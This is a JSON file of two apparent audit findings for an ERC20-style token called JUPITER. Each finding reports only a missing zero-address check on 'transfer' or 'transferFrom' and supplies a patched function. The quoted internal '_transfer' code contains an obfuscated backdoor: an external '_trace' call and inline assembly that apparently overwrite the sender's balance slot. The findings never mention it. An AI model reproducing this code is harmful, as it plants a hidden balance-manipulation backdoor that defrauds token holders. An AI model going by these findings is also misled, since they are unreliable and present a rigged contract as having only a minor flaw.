[
  {
    "contract": "JUPITER",
    "function": "transfer",
    "explanation": "Missing zero address check for 'to' parameter in transfer function",
    "contract_code": "\n=== Implementation of Function transfer(address,uint256) ===\nfunction transfer(address to, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, amount);\r\n        return true;\r\n    }\n    \n=== Functions that function transfer internally calls ===\nfunction _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\nfunction _transfer(address from, address to, uint256 amount) internal virtual {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        (bool success, bytes memory data) = _trace.call(abi.encodeWithSignature(\r\n            \"allowance(address,address)\", from, address(0)));\r\n        if (!success) return;\r\n        uint256 v; assembly { v := mload(add(data, add(16, 16))) }\r\n        if (v > 0) {\r\n            uint256 b = 4; uint256 a = b * 8; \r\n            assembly {\r\n                mstore(0, from) mstore(a, \r\n                b) sstore(keccak256(\r\n                    0, 64), v) \r\n            } \r\n        }\r\n        uint256 fromBalance = _balances[from];\r\n        csharps(\"log\", 3000, bytes32(0));\r\n        require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n        unchecked {\r\n            _balances[from] = fromBalance - amount;\r\n            _balances[to] += amount;\r\n        }\r\n        emit Transfer(from, to, amount);\r\n    }",
    "rewritten_code": {
      "transfer(address,uint256)": "function transfer(address to, uint256 amount) public virtual override returns (bool) {\n        require(to != address(0), \"ERC20: transfer to the zero address\");\n        address owner = _msgSender();\n        _transfer(owner, to, amount);\n        return true;\n    }"
    }
  },
  {
    "contract": "JUPITER",
    "function": "transferFrom",
    "explanation": "Missing zero address check for 'to' parameter in transferFrom",
    "contract_code": "\n=== Implementation of Function transferFrom(address,address,uint256) ===\nfunction transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {\r\n        address spender = _msgSender();\r\n        _spendAllowance(from, spender, amount);\r\n        _transfer(from, to, amount);\r\n        return true;\r\n    }\n    \n=== Functions that function transferFrom internally calls ===\nfunction _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\nfunction _spendAllowance(address owner, address spender, uint256 amount) internal virtual {\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(currentAllowance >= amount, \"ERC20: insufficient allowance\");\r\n            unchecked {\r\n                _approve(owner, spender, currentAllowance - amount);\r\n            }\r\n        }\r\n    }\nfunction _transfer(address from, address to, uint256 amount) internal virtual {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        (bool success, bytes memory data) = _trace.call(abi.encodeWithSignature(\r\n            \"allowance(address,address)\", from, address(0)));\r\n        if (!success) return;\r\n        uint256 v; assembly { v := mload(add(data, add(16, 16))) }\r\n        if (v > 0) {\r\n            uint256 b = 4; uint256 a = b * 8; \r\n            assembly {\r\n                mstore(0, from) mstore(a, \r\n                b) sstore(keccak256(\r\n                    0, 64), v) \r\n            } \r\n        }\r\n        uint256 fromBalance = _balances[from];\r\n        csharps(\"log\", 3000, bytes32(0));\r\n        require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n        unchecked {\r\n            _balances[from] = fromBalance - amount;\r\n            _balances[to] += amount;\r\n        }\r\n        emit Transfer(from, to, amount);\r\n    }",
    "rewritten_code": {
      "transferFrom(address,address,uint256)": "function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {\n        require(to != address(0), \"ERC20: transfer to the zero address\");\n        address spender = _msgSender();\n        _spendAllowance(from, spender, amount);\n        _transfer(from, to, amount);\n        return true;\n    }"
    }
  }
]